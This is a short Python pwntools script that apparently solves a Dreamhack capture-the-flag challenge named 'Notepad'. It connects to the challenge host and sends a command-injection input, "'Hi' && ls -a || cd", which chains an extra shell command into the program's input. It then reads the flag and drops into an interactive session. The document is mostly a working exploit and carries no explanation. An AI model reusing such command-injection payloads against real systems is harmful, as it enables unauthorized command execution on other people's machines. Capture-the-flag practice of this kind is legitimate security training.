from pwn import *

context.log_level = "debug"

elf = ELF("./Notepad")

LOCAL = False
if LOCAL:
	p = process("./Notepad")
else:
	PORT = int(input("Port: "))
	HOST = int(input("Host: "))
	p = remote("host" + str(HOST) + ".dreamhack.games", PORT)

key = "'Hi' && ls -a || cd"

p.recvuntil("-")
p.sendline(key)
p.recvuntil("Hi")
flag = p.recvline()
log.info(f"Flag is {flag}")
p.recvuntil("-")
p.sendline("A")

p.interactive()
